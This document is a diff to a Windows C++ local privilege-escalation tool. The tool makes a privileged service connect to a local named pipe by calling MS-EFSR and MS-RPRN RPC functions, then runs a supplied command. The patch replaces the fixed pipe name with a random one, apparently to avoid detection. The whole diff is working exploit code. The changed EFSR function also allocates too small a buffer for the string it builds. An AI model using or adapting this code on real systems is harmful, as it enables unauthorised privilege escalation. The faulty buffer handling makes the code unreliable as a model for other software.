@@ -14,7 +14,7 @@
 #include <winsdkver.h>
 #define _WIN32_WINNT 0x0601
 #include <sdkddkver.h>
-
+#include <random>
 
 #include "lib/ms-efsr_h.h"
 #include "lib/ms-rprn_h.h"
@@ -33,6 +33,19 @@ struct NamedPipeThreadArgs {
     const wchar_t* pipePath;
 };
 
+wchar_t* generateRandomString() {
+    static const wchar_t caracteresPermis[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    static const int tailleCaracteresPermis = sizeof(caracteresPermis) / sizeof(wchar_t);
+    std::mt19937 generateur(std::random_device{}());
+    int l = (generateur() + 1) % 25;
+    wchar_t* randomString = new wchar_t[l + 1];
+    for (int i = 0; i < l; ++i) {
+        randomString[i] = caracteresPermis[generateur() % tailleCaracteresPermis];
+    }
+    randomString[l] = L'\0';
+
+    return randomString;
+}
 
 void handleError(long result) {
     wprintf(L"[*] Error code returned : %ld\r\n", result);
@@ -265,14 +278,22 @@ BOOL createNamedPipe(wchar_t* namedpipe, wchar_t* commandExecuted) {
     return TRUE;
 }
 
-long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force)
+long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force, std::wstring randomNamedpipe)
 {
-    wprintf(L"[MS-EFSR] [*] Attempting MS-EFSR functions...\r\n\n");
     long result;
+    wprintf(L"[MS-EFSR] [*] Attempting MS-EFSR functions...\r\n\n");
 
     LPWSTR targetedPipeName;
-    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
-    StringCchPrintf(targetedPipeName, MAX_PATH, L"\\\\127.0.0.1/pipe/coerced\\C$\\\x00");
+    std::wstring chaine1 = L"\\\\127.0.0.1/pipe/";
+    std::wstring filename = L"\\C$\\\x00";
+    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, (chaine1.length() + randomNamedpipe.length() + 1) * sizeof(wchar_t)); // Allouez la mémoire
+
+    if (targetedPipeName) {
+        StringCchCopy(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, chaine1.c_str()); // Copiez la chaîne chaine1
+        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, randomNamedpipe.c_str()); // Concaténez la chaîne randomNamedpipe
+        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + filename.length() + 1, filename.c_str()); // Concaténez la chaîne randomNamedpipe
+
+    }
 
     std::function<int()> functions[] = {
         [&]() { return callEfsRpcOpenFileRaw(Binding, targetedPipeName); },
@@ -316,14 +337,17 @@ long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force)
 }
 
 
-long callRprnFunctions(int exploitID, bool force) {
-    wprintf(L"[MS-RPRN] [*] Attempting MS-RPRN functions...\r\n\n");
+long callRprnFunctions(int exploitID, bool force, std::wstring randomNamedpipe) {
     long result;
-
+    wprintf(L"[MS-RPRN] [*] Attempting MS-RPRN functions...\r\n\n");
     LPWSTR targetedPipeName;
-    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
-    StringCchPrintf(targetedPipeName, MAX_PATH, L"\\\\127.0.0.1/pipe/coerced");
+    std::wstring chaine1 = L"\\\\127.0.0.1/pipe/";
+    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, (chaine1.length() + randomNamedpipe.length() + 1) * sizeof(wchar_t));
 
+    if (targetedPipeName) {
+        StringCchCopy(targetedPipeName, chaine1.length() + randomNamedpipe.length() + 1, chaine1.c_str());
+        StringCchCat(targetedPipeName, chaine1.length() + randomNamedpipe.length() + 1, randomNamedpipe.c_str());
+    }
 
     std::function<int()> functions[] = {
         [&]() { return callRpcRemoteFindFirstPrinterChangeNotificationEx(targetedPipeName); },
@@ -357,10 +381,13 @@ long callRprnFunctions(int exploitID, bool force) {
     return -1;
 }
 
-BOOL exploitMsEfsr(wchar_t* command, int exploitId, bool force) {
+BOOL exploitMsEfsr(wchar_t* command, int exploitId, bool force, std::wstring randomNamedpipe) {
     wchar_t* namedpipe;
     namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
-    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\coerced\\pipe\\srvsvc");
+
+    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\");
+    StringCchCat(namedpipe, MAX_PATH, randomNamedpipe.c_str());
+    StringCchCat(namedpipe, MAX_PATH, L"\\pipe\\srvsvc");
 
     if (!createNamedPipe(namedpipe, command)) {
         wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
@@ -376,32 +403,36 @@ BOOL exploitMsEfsr(wchar_t* command, int exploitId, bool force) {
     }
     Sleep(500);
     long result;
-    result = CallEfsrFunctions(RPCBind, exploitId, force) == 0;
+    result = CallEfsrFunctions(RPCBind, exploitId, force, randomNamedpipe) == 0;
     return result;
 }
 
-BOOL exploitMsRprn(wchar_t* command, int exploitId, bool force) {
-    long result;
-    wchar_t* namedpipe;
-    namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
-    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\coerced\\pipe\\spoolss");
+BOOL exploitMsRprn(wchar_t* command, int exploitId, bool force, std::wstring randomNamedpipe) {
+    wchar_t* namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
+
+    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\");
+    StringCchCat(namedpipe, MAX_PATH, randomNamedpipe.c_str());
+    StringCchCat(namedpipe, MAX_PATH, L"\\pipe\\spoolss");
+
+
+
     if (!createNamedPipe(namedpipe, command)) {
         wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
         return FALSE;
     }
     Sleep(500);
-    return callRprnFunctions(exploitId, force) == 0;
+    return callRprnFunctions(exploitId, force, randomNamedpipe) == 0;
 }
 
 
-void exploitAll(wchar_t* command, int exploitId, bool force) {
+void exploitAll(wchar_t* command, int exploitId, bool force, std::wstring randomNamedpipe) {
     wprintf(L"[+] RUNNING ALL KNOWN EXPLOITS.\r\n\n");
     BOOL stopFuzzing = FALSE;
-    if (!stopFuzzing){
-        stopFuzzing=exploitMsRprn(command, exploitId, force);
+    if (!stopFuzzing) {
+        stopFuzzing = exploitMsRprn(command, exploitId, force, randomNamedpipe);
     }
-    if (!stopFuzzing or force){
-        stopFuzzing=exploitMsEfsr(command, exploitId, force);
+    if (!stopFuzzing or force) {
+        stopFuzzing = exploitMsEfsr(command, exploitId, force, randomNamedpipe);
     }
 }
 
@@ -451,6 +482,8 @@ int main(int argc, char** argv)
     size_t convertedChars = 0;
     mbstowcs_s(&convertedChars, command, maxBufferSize, charPointer, maxBufferSize - 1);
 
+    std::wstring randomNamedpipe = generateRandomString();
+
     g_pwszCommandLine = command;
     g_bInteractWithConsole = interactive;
 
@@ -462,20 +495,20 @@ int main(int argc, char** argv)
     }
 
     if (rpcInterface.empty() and exploitId == -1) {
-        exploitAll(command, exploitId, force);
+        exploitAll(command, exploitId, force, randomNamedpipe);
         return 0;
     }
     else {
         if (rpcInterface == "ms-rprn") {
-            exploitMsRprn(command, exploitId, force);
+            exploitMsRprn(command, exploitId, force, randomNamedpipe);
         }
         else if (rpcInterface == "ms-efsr") {
-            exploitMsEfsr(command, exploitId, force);
+            exploitMsEfsr(command, exploitId, force, randomNamedpipe);
         }
     }
 
     return 0;
-    
+
 }
 
 
@@ -560,7 +593,7 @@ handle_t __RPC_USER SRVSVC_HANDLE_bind(SRVSVC_HANDLE pszSystemName)
 
     status = RpcStringBindingComposeW(NULL,(RPC_WSTR) L"ncacn_np", (RPC_WSTR)pszSystemName, (RPC_WSTR) L"\\pipe\\srvsvc", NULL, &pszStringBinding);
 
-    
+
     if (status)
     {
         wprintf(L"RpcStringBindingCompose returned %ld\n", status);
